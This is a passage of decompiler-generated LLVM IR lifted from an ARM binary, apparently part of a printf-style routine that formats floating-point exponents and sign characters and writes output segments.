  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_1665c

dec_label_pc_1663c:                               ; preds = %dec_label_pc_165e0
  store i1 %v2_165c0, i1* %cpsr_z.global-to-local, align 1
  %v2_16640 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16640, i32* %lr.global-to-local, align 4
  br i1 %v2_165c0, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_1663c
  %v3_16648 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_16648, i32* %r7.global-to-local, align 4
  br label %.thread35

bb243:                                            ; preds = %dec_label_pc_1663c
  %v3_1664c = sub i32 %v2_165d4, %v1_1664c31
  store i32 %v3_1664c, i32* %ip.global-to-local, align 4
  %v3_1665064 = add i32 %v5_165bc, %v1_1664c31
  store i32 %v3_1665064, i32* %r6.global-to-local, align 4
  %v3_16654 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_16654, i32* %r7.global-to-local, align 4
  br label %.thread35

.thread35:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_1669c265 = phi i32 [ %v3_16648, %bb242 ], [ %v3_16654, %bb243 ], [ %v7_16604, %.thread148 ]
  %v0_16670102 = phi i32 [ %v2_165d4, %bb242 ], [ %v3_1664c, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1665c

dec_label_pc_1665c:                               ; preds = %.thread, %dec_label_pc_16610, %.thread35
  %v1_1669c = phi i32 [ %v2_16620, %dec_label_pc_16610 ], [ %v1_1669c265, %.thread35 ], [ %v5_165d8, %.thread ]
  %v0_166b0109 = phi i32 [ -1, %dec_label_pc_16610 ], [ -1, %.thread35 ], [ %v1_1664c31, %.thread ]
  %v0_16670 = phi i32 [ 0, %dec_label_pc_16610 ], [ %v0_16670102, %.thread35 ], [ %v2_165d4, %.thread ]
  %v3_1665c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1665c, i32* %r2.global-to-local, align 4
  %v1_16660 = add i32 %v3_1665c, 12
  %v2_16660 = inttoptr i32 %v1_16660 to i32*
  %v3_16660 = load i32, i32* %v2_16660, align 4
  %v1_16664 = and i32 %v3_16660, 16
  store i32 %v1_16664, i32* %r4.global-to-local, align 4
  %v2_16664 = icmp eq i32 %v1_16664, 0
  %tmp270 = zext i1 %v2_16664 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_16670 = icmp eq i32 %v0_16670, 0
  store i1 %v2_16670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16670, label %bb246, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1665c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1668c

bb246:                                            ; preds = %dec_label_pc_1665c
  store i1 %v2_16664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16664, label %dec_label_pc_16680, label %dec_label_pc_1668c

dec_label_pc_16680:                               ; preds = %bb246
  %v0_16680 = load i32, i32* %sb.global-to-local, align 4
  %v7_16680 = icmp eq i32 %v0_16680, 103
  store i1 %v7_16680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16680, label %dec_label_pc_166b0, label %bb247

bb247:                                            ; preds = %dec_label_pc_16680
  %v1_16684 = load i32, i32* %fp.global-to-local, align 4
  %v3_16684 = icmp eq i32 %v1_16684, 0
  store i1 %v3_16684, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_16684, 1
  br i1 %tmp248, label %dec_label_pc_166b0, label %dec_label_pc_1668c

dec_label_pc_1668c:                               ; preds = %.thread38, %bb246, %bb247
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34240), i32* %r3.global-to-local, align 4
  %v2_1669c = inttoptr i32 %v1_1669c to i32*
  store i32 112, i32* %v2_1669c, align 4
  %v0_166a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_166a0 = add i32 %v0_166a0, 16
  store i32 %v1_166a0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_166a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_166a8 = add i32 %v0_166a8, 4
  %v2_166a8 = inttoptr i32 %v1_166a8 to i32*
  store i32 1, i32* %v2_166a8, align 4
  %v4_166a8 = add i32 %v0_166a8, 8
  %v5_166a8 = inttoptr i32 %v4_166a8 to i32*
  %v6_166a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_166a8, i32* %v5_166a8, align 4
  %v0_166ac = load i32, i32* %r7.global-to-local, align 4
  %v1_166ac = add i32 %v0_166ac, 12
  store i32 %v1_166ac, i32* %r7.global-to-local, align 4
  %v0_166b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_166b0

dec_label_pc_166b0:                               ; preds = %dec_label_pc_16680, %bb247, %dec_label_pc_1668c
  %v1_166d0 = phi i32 [ %v1_1669c, %bb247 ], [ %v1_166ac, %dec_label_pc_1668c ], [ %v1_1669c, %dec_label_pc_16680 ]
  %v0_166b0 = phi i32 [ %v0_166b0109, %bb247 ], [ %v0_166b0.pre, %dec_label_pc_1668c ], [ %v0_166b0109, %dec_label_pc_16680 ]
  %v1_166b0 = add i32 %v0_166b0, 1
  store i32 %v1_166b0, i32* %lr.global-to-local, align 4
  %v6_166b0 = icmp slt i32 %v1_166b0, 0
  %v7_166b0 = icmp eq i32 %v1_166b0, 0
  store i1 %v7_166b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_166b0, label %dec_label_pc_166b8, label %dec_label_pc_166dc

dec_label_pc_166b8:                               ; preds = %dec_label_pc_166b0
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34237), i32* %r3.global-to-local, align 4
  %v1_166c8 = sub i32 -1, %v0_166b0
  store i32 %v1_166c8, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_166d0 = inttoptr i32 %v1_166d0 to i32*
  store i32 176, i32* %v2_166d0, align 4
  %v0_166d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_166d4 = add i32 %v0_166d4, 4
  %v2_166d4 = inttoptr i32 %v1_166d4 to i32*
  %v3_166d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_166d4, i32* %v2_166d4, align 4
  %v4_166d4 = add i32 %v0_166d4, 8
  %v5_166d4 = inttoptr i32 %v4_166d4 to i32*
  %v6_166d4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_166d4, i32* %v5_166d4, align 4
  %v0_166d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_166d8 = add i32 %v0_166d8, 12
  store i32 %v1_166d8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_166dc

dec_label_pc_166dc:                               ; preds = %dec_label_pc_166b0, %dec_label_pc_166b8
  %v2_166e4 = phi i32 [ %v1_166d0, %dec_label_pc_166b0 ], [ %v1_166d8, %dec_label_pc_166b8 ]
  %v0_166dc = load i32, i32* %ip.global-to-local, align 4
  %v2_166dc = icmp eq i32 %v0_166dc, 0
  store i1 %v2_166dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_166dc, label %.thread47, label %bb249

bb249:                                            ; preds = %dec_label_pc_166dc
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_166e4 = inttoptr i32 %v2_166e4 to i32*
  store i32 112, i32* %v3_166e4, align 4
  %v1_166e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_166e8 = load i32, i32* %r7.global-to-local, align 4
  %v3_166e8 = add i32 %v2_166e8, 8
  %v4_166e8 = inttoptr i32 %v3_166e8 to i32*
  store i32 %v1_166e8, i32* %v4_166e8, align 4
  %v1_166ec = load i32, i32* %ip.global-to-local, align 4
  %v2_166ec = load i32, i32* %r7.global-to-local, align 4
  %v3_166ec = add i32 %v2_166ec, 4
  %v4_166ec = inttoptr i32 %v3_166ec to i32*
  store i32 %v1_166ec, i32* %v4_166ec, align 4
  %v1_166f0 = load i32, i32* %r7.global-to-local, align 4
  %v2_166f0 = add i32 %v1_166f0, 12
  store i32 %v2_166f0, i32* %r7.global-to-local, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_166dc, %bb249
  %v1_16728 = phi i32 [ %v2_166e4, %dec_label_pc_166dc ], [ %v2_166f0, %bb249 ]
  %v0_166f4 = load i32, i32* %sb.global-to-local, align 4
  %v7_166f4 = icmp eq i32 %v0_166f4, 103
  store i1 %v7_166f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_166f4, label %dec_label_pc_166fc, label %dec_label_pc_16704

dec_label_pc_166fc:                               ; preds = %.thread47
  %v0_166fc = load i32, i32* %r4.global-to-local, align 4
  %v2_166fc = icmp eq i32 %v0_166fc, 0
  store i1 %v2_166fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_166fc, label %dec_label_pc_16734, label %dec_label_pc_16704

dec_label_pc_16704:                               ; preds = %.thread47, %dec_label_pc_166fc
  %v0_16704 = load i32, i32* %lr.global-to-local, align 4
  %v1_16704 = load i32, i32* %ip.global-to-local, align 4
  %v2_16704 = sub i32 %v1_16704, %v0_16704
  store i32 %v2_16704, i32* %r1.global-to-local, align 4
  %v1_16708 = load i32, i32* %fp.global-to-local, align 4
  %v2_16708 = sub i32 %v2_16704, %v1_16708
  %v4_16708 = xor i32 %v1_16708, %v2_16704
  %v5_16708 = xor i32 %v2_16708, %v2_16704
  %v6_16708 = and i32 %v5_16708, %v4_16708
  %v7_16708 = icmp slt i32 %v6_16708, 0
  %v8_16708 = icmp slt i32 %v2_16708, 0
  %v9_16708 = icmp eq i32 %v2_16704, %v1_16708
  store i1 %v9_16708, i1* %cpsr_z.global-to-local, align 1
  %v2_1670c = xor i1 %v8_16708, %v7_16708
  br i1 %v2_1670c, label %dec_label_pc_16710, label %dec_label_pc_16734

dec_label_pc_16710:                               ; preds = %dec_label_pc_16704
  %v2_1671c = sub i32 %v1_16708, %v2_16704
  store i32 %v2_1671c, i32* %r1.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34237), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_16728 = inttoptr i32 %v1_16728 to i32*
  store i32 176, i32* %v2_16728, align 4
  %v0_1672c = load i32, i32* %r7.global-to-local, align 4
  %v1_1672c = add i32 %v0_1672c, 4
  %v2_1672c = inttoptr i32 %v1_1672c to i32*
  %v3_1672c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1672c, i32* %v2_1672c, align 4
  %v4_1672c = add i32 %v0_1672c, 8
  %v5_1672c = inttoptr i32 %v4_1672c to i32*
  %v6_1672c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1672c, i32* %v5_1672c, align 4
  %v0_16730 = load i32, i32* %r7.global-to-local, align 4
  %v1_16730 = add i32 %v0_16730, 12
  store i32 %v1_16730, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16734

dec_label_pc_16734:                               ; preds = %dec_label_pc_16704, %dec_label_pc_166fc, %dec_label_pc_16710
  %v1_167c8.pre.pre = phi i32 [ %v1_16728, %dec_label_pc_16704 ], [ %v1_16728, %dec_label_pc_166fc ], [ %v1_16730, %dec_label_pc_16710 ]
  %v0_16734 = load i32, i32* %r8.global-to-local, align 4
  %v7_16734 = icmp eq i32 %v0_16734, 102
  store i1 %v7_16734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16734, label %dec_label_pc_167bc, label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %dec_label_pc_16734
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16740 = load i32, i32* %r0.global-to-local, align 4
  %v1_16740 = icmp slt i32 %v0_16740, 0
  %v2_16740 = icmp eq i32 %v0_16740, 0
  store i1 %v2_16740, i1* %cpsr_z.global-to-local, align 1
  %v4_16744 = select i1 %tmp275, i32 %v4_16460126130, i32 101
  store i32 %v4_16744, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_16754 = sub i32 0, %v0_16740
  %storemerge158 = select i1 %v1_16740, i32 %v4_16754, i32 %v0_16740
  %tmp271 = ashr i32 %v0_16740, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1675c = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1675c, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16764

dec_label_pc_16764:                               ; preds = %dec_label_pc_16794, %dec_label_pc_16764, %dec_label_pc_1673c
  %v2_1677c = phi i32 [ %v2_1675c, %dec_label_pc_1673c ], [ %v6_1677c, %dec_label_pc_16764 ], [ %v6_1677c, %dec_label_pc_16794 ]
  %v0_16774 = phi i32 [ %storemerge158, %dec_label_pc_1673c ], [ %v2_16780, %dec_label_pc_16764 ], [ %v2_16780, %dec_label_pc_16794 ]
  %v3_1676c = urem i32 %v0_16774, 10
  %v1_16770 = or i32 %v3_1676c, 48
  store i32 %v1_16770, i32* %r3.global-to-local, align 4
  store i32 %v0_16774, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1677c = trunc i32 %v1_16770 to i8
  %v3_1677c = add i32 %v2_1677c, -1
  %v4_1677c = inttoptr i32 %v3_1677c to i8*
  store i8 %v1_1677c, i8* %v4_1677c, align 1
  %v5_1677c = load i32, i32* %r6.global-to-local, align 4
  %v6_1677c = add i32 %v5_1677c, -1
  store i32 %v6_1677c, i32* %r6.global-to-local, align 4
  %v0_16780 = load i32, i32* %r0.global-to-local, align 4
  %v1_16780 = load i32, i32* %r1.global-to-local, align 4
  %v2_16780 = sdiv i32 %v0_16780, %v1_16780
  store i32 %v2_16780, i32* %r0.global-to-local, align 4
  %v0_16784 = load i32, i32* %r8.global-to-local, align 4
  %v1_16784 = add i32 %v0_16784, 1
  store i32 %v1_16784, i32* %r8.global-to-local, align 4
  %v7_16788 = icmp eq i32 %v1_16784, 3
  store i1 %v7_16788, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16780, i32* %r5.global-to-local, align 4
  br i1 %v7_16788, label %dec_label_pc_16764, label %dec_label_pc_16794

dec_label_pc_16794:                               ; preds = %dec_label_pc_16764
  %v2_16794 = icmp eq i32 %v2_16780, 0
  store i1 %v2_16794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16794, label %dec_label_pc_1679c, label %dec_label_pc_16764

dec_label_pc_1679c:                               ; preds = %dec_label_pc_16794
  %v1_1679c = add i32 %v5_1677c, -2
  store i32 %v1_1679c, i32* %r3.global-to-local, align 4
  %v0_167a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_167a0 = trunc i32 %v0_167a0 to i8
  %v4_167a0 = inttoptr i32 %v1_1679c to i8*
  store i8 %v1_167a0, i8* %v4_167a0, align 1
  %v0_167a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_167a4 = add i32 %v0_167a4, -1
  store i32 %v1_167a4, i32* %r2.global-to-local, align 4
  %v0_167a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_167a8 = trunc i32 %v0_167a8 to i8
  %v4_167a8 = inttoptr i32 %v1_167a4 to i8*
  store i8 %v1_167a8, i8* %v4_167a8, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_167b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_167b0 = inttoptr i32 %v0_167b0 to i32*
  store i32 112, i32* %v1_167b0, align 4
  %v3_167b0 = add i32 %v0_167b0, 4
  %v4_167b0 = inttoptr i32 %v3_167b0 to i32*
  %v5_167b0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_167b0, i32* %v4_167b0, align 4
  %v0_167b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_167b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_167b4 = add i32 %v1_167b4, 8
  %v3_167b4 = inttoptr i32 %v2_167b4 to i32*
  store i32 %v0_167b4, i32* %v3_167b4, align 4
  %v0_167b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_167b8 = add i32 %v0_167b8, 12
  store i32 %v1_167b8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_167bc

dec_label_pc_167bc:                               ; preds = %dec_label_pc_16734, %.thread124, %dec_label_pc_1679c
  %v1_167c8.pre = phi i32 [ %v2_16294, %.thread124 ], [ %v1_167b8, %dec_label_pc_1679c ], [ %v1_167c8.pre.pre, %dec_label_pc_16734 ]
  %v2_167bc = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_167bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_167c0

dec_label_pc_167c0:                               ; preds = %dec_label_pc_167c0, %dec_label_pc_167bc
  %v0_167c0 = phi i32 [ %v2_167bc, %dec_label_pc_167bc ], [ %v4_167c0, %dec_label_pc_167c0 ]
  %stack_var_-188.0 = phi i32 [ %v3_16130, %dec_label_pc_167bc ], [ %v2_167cc, %dec_label_pc_167c0 ]
  %v1_167c0 = inttoptr i32 %v0_167c0 to i32*
  %v2_167c0 = load i32, i32* %v1_167c0, align 4
  store i32 %v2_167c0, i32* %r3.global-to-local, align 4
  %v4_167c0 = add i32 %v0_167c0, 12
  store i32 %v4_167c0, i32* %r2.global-to-local, align 4
  %v3_167c8 = icmp ult i32 %v4_167c0, %v1_167c8.pre
  %v2_167cc = sub i32 %stack_var_-188.0, %v2_167c0
  store i32 %v2_167cc, i32* %ip.global-to-local, align 4
  br i1 %v3_167c8, label %dec_label_pc_167c0, label %dec_label_pc_167d8

dec_label_pc_167d8:                               ; preds = %dec_label_pc_167c0
  %v3_167d8 = load i8, i8* %stack_var_-46, align 1
  %v4_167d8 = sext i8 %v3_167d8 to i32
  store i32 %v4_167d8, i32* %r3.global-to-local, align 4
  store i32 %v4_167d8, i32* %r2.global-to-local, align 4
  %v2_167dc = icmp eq i8 %v3_167d8, 0
  store i1 %v2_167dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_167dc, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_167d8
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_167d8, %bb253
  %v1_1683c = phi i32 [ %v4_167d8, %dec_label_pc_167d8 ], [ 1, %bb253 ]
  %v2_167e4 = sub i32 %v2_167cc, %v1_1683c
  store i32 %v2_167e4, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_167ec = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_167ec, i32* %r3.global-to-local, align 4
  %v2_167f0 = icmp eq i32 %v2_167e4, 0
  store i1 %v2_167f0, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_167e4, 1
  br i1 %tmp255, label %dec_label_pc_16858, label %dec_label_pc_16804

dec_label_pc_16804:                               ; preds = %bb254
  %v3_16804 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16804, i32* %lr.global-to-local, align 4
  %v1_16808 = add i32 %v3_16804, 12
  %v2_16808 = inttoptr i32 %v1_16808 to i32*
  %v3_16808 = load i32, i32* %v2_16808, align 4
  store i32 %v3_16808, i32* %r3.global-to-local, align 4
  %v1_1680c = and i32 %v3_16808, 8
  %v2_1680c = icmp eq i32 %v1_1680c, 0
  store i1 %v2_1680c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1680c, label %dec_label_pc_16830, label %dec_label_pc_16814

dec_label_pc_16814:                               ; preds = %dec_label_pc_16804
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34237), i32* %r3.global-to-local, align 4
  %v1_16824 = add i32 %v1_167c8.pre, 12
  store i32 %v1_16824, i32* %r6.global-to-local, align 4
  %v1_16828 = inttoptr i32 %v1_167c8.pre to i32*
  store i32 160, i32* %v1_16828, align 4
  %v3_16828 = add i32 %v1_167c8.pre, 4
  %v4_16828 = inttoptr i32 %v3_16828 to i32*
  %v5_16828 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16828, i32* %v4_16828, align 4
  %v6_16828 = add i32 %v1_167c8.pre, 8
  %v7_16828 = inttoptr i32 %v6_16828 to i32*
  %v8_16828 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_16828, i32* %v7_16828, align 4
  br label %dec_label_pc_1685c

dec_label_pc_16830:                               ; preds = %dec_label_pc_16804
  store i32 %v3_16804, i32* %ip.global-to-local, align 4
  %v1_16834 = add i32 %v3_16804, 16
  %v2_16834 = inttoptr i32 %v1_16834 to i32*
  %v3_16834 = load i32, i32* %v2_16834, align 4
  store i32 %v3_16834, i32* %r3.global-to-local, align 4
  %v7_16838 = icmp eq i32 %v3_16834, 48
  store i1 %v7_16838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16838, label %.thread55.thread71, label %bb256

bb256:                                            ; preds = %dec_label_pc_16830
  store i32 %v2_167cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16858

.thread55.thread71:                               ; preds = %dec_label_pc_16830
  %v4_16844 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_167c8.pre, i32* %r6.global-to-local, align 4
  %v3_1684c = add i32 %v4_16844, %v2_167e4
  store i32 %v3_1684c, i32* %r3.global-to-local, align 4
  store i32 %v3_1684c, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1685c

dec_label_pc_16858:                               ; preds = %bb256, %bb254
  store i32 %v1_167c8.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1685c

dec_label_pc_1685c:                               ; preds = %.thread55.thread71, %dec_label_pc_16814, %dec_label_pc_16858
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_16860 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16860, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16864

dec_label_pc_16864:                               ; preds = %dec_label_pc_1688c, %dec_label_pc_1685c
  %v0_16864 = phi i32 [ %v1_16880, %dec_label_pc_1688c ], [ %v2_16860, %dec_label_pc_1685c ]
  %v1_16864 = inttoptr i32 %v0_16864 to i32*
  %v2_16864 = load i32, i32* %v1_16864, align 4
  store i32 %v2_16864, i32* %r1.global-to-local, align 4
  %v3_16864 = add i32 %v0_16864, 4
  %v4_16864 = inttoptr i32 %v3_16864 to i32*
  %v5_16864 = load i32, i32* %v4_16864, align 4
  store i32 %v5_16864, i32* %r2.global-to-local, align 4
  %v6_16864 = add i32 %v0_16864, 8
  %v7_16864 = inttoptr i32 %v6_16864 to i32*
  %v8_16864 = load i32, i32* %v7_16864, align 4
  store i32 %v8_16864, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 92280, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_16878 = load i32, i32* %r5.global-to-local, align 4
  %v1_16878 = add i32 %v0_16878, 4
  %v2_16878 = inttoptr i32 %v1_16878 to i32*
  %v3_16878 = load i32, i32* %v2_16878, align 4
  store i32 %v3_16878, i32* %r3.global-to-local, align 4
  %v0_1687c = load i32, i32* %r0.global-to-local, align 4
  %v9_1687c = icmp eq i32 %v0_1687c, %v3_16878
  store i1 %v9_1687c, i1* %cpsr_z.global-to-local, align 1
  %v1_16880 = add i32 %v0_16878, 12
  store i32 %v1_16880, i32* %r5.global-to-local, align 4
  br i1 %v9_1687c, label %dec_label_pc_1688c, label %bb257

bb257:                                            ; preds = %dec_label_pc_16864
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_168ac

dec_label_pc_1688c:                               ; preds = %dec_label_pc_16864
  %v0_16890.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1688c = load i32, i32* %r6.global-to-local, align 4
  %v3_1688c = icmp ult i32 %v1_16880, %v1_1688c
  %v9_1688c = icmp eq i32 %v1_16880, %v1_1688c
  store i1 %v9_1688c, i1* %cpsr_z.global-to-local, align 1
  %v2_16890 = add i32 %v0_16890.pre, %v3_16878
  store i32 %v2_16890, i32* %r7.global-to-local, align 4
  br i1 %v3_1688c, label %dec_label_pc_16864, label %dec_label_pc_168ac

dec_label_pc_168a4:                               ; preds = %.thread22, %bb239
  %v0_168a4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_168a4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_165a4

dec_label_pc_168ac:                               ; preds = %dec_label_pc_1688c, %bb257
  %v0_168ac = phi i32 [ -1, %bb257 ], [ %v2_16890, %dec_label_pc_1688c ]
  store i32 %v0_168ac, i32* %r0.global-to-local, align 4
  store i32 %v27_160e8, i32* @lr, align 4
  ret i32 %v0_168ac

; uselistorder directives
  uselistorder i32 %v0_168ac, { 1, 0 }
  uselistorder i32 %v1_1688c, { 1, 0 }
  uselistorder i32 %v1_16880, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16864, { 2, 1, 0 }
  uselistorder i32 %v3_16804, { 1, 0, 2, 3 }
  uselistorder i32 %v2_167cc, { 0, 1, 3, 2 }
  uselistorder i32 %v4_167c0, { 1, 2, 0 }
  uselistorder i32 %v0_167c0, { 1, 0 }
  uselistorder i32 %v1_167c8.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_16780, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1677c, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_16740, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_16708, { 1, 0 }
  uselistorder i32 %v1_16708, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16704, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_16664, { 2, 1, 0 }
  uselistorder i32 %v2_165e4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_165d4, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_165c0, { 1, 0, 2 }
  uselistorder i32 %v5_165bc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1664c31, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_16574, { 1, 0 }
  uselistorder i32 %v1_1656c, { 1, 2, 0 }
  uselistorder i32 %v2_16560, { 1, 0 }
  uselistorder i32 %v1_16560, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16560, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_16530, { 1, 0 }
  uselistorder i32 %v0_16530, { 0, 2, 1 }
  uselistorder i32 %v2_1652c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_16518, { 1, 0 }
  uselistorder i1 %v2_16508, { 1, 0 }
  uselistorder i32 %v1_16504, { 3, 2, 1, 0 }
  uselistorder i32 %v2_16500, { 1, 0 }
  uselistorder i1 %v2_164f0, { 1, 0 }
  uselistorder i32 %v1_164e4, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_16498, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16498, { 1, 0, 2 }
  uselistorder i1 %v2_16480, { 1, 0 }
  uselistorder i32 %v5_16468, { 1, 0 }
  uselistorder i32 %v0_16454, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1643c, { 1, 2, 0 }
  uselistorder i32 %v2_16438, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_163d0, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16378, { 1, 0 }
  uselistorder double %v2_1633c, { 1, 0 }
  uselistorder i32 %v0_162f8, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_162ec, { 1, 0 }
  uselistorder i32 %v2_16328, { 1, 3, 0, 2 }
  uselistorder i32 %v0_162bc, { 1, 0 }
  uselistorder i32 %v5_16278, { 1, 0 }
  uselistorder i32 %v1_16198.v0_161846, { 1, 0 }
  uselistorder i32 %v3_16254, { 1, 0 }
  uselistorder i32 %v0_16230, { 0, 2, 3, 1 }
  uselistorder i32 %v2_16218, { 2, 1, 0 }
  uselistorder i32 %v0_161fc, { 1, 0 }
  uselistorder i32 %v0_1611c, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
